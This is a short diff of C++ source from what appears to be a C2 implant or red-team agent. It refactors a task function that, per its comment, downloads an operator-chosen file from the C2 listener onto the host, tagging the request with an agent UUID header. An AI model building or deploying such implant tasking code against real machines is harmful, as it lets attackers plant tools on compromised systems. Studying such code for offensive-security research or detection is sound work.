@@ -2,16 +2,17 @@
 
 namespace Task
 {
-    std::wstring Upload(State::StateManager& sm, const std::wstring& wSrc, const std::wstring& wDest)
+    std::wstring Upload(State::PState pState, const std::wstring& wSrc, const std::wstring& wDest)
     {
-        std::wstring wHeaders = L"X-UUID: " + sm.GetUUID() + L"\r\n";
+        std::wstring wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";
 
         // Download a specified file from the C2 server.
         BOOL bResult = System::Http::DownloadFile(
-            sm.GetHConnect(),
-            sm.GetListenerHost(),
-            sm.GetListenerPort(),
-            sm.GetReqPathDownload(),
+            pState->pProcs,
+            pState->hConnect,
+            pState->lpListenerHost,
+            pState->nListenerPort,
+            pState->lpReqPathDownload,
             wHeaders.c_str(),
             wSrc,
             wDest
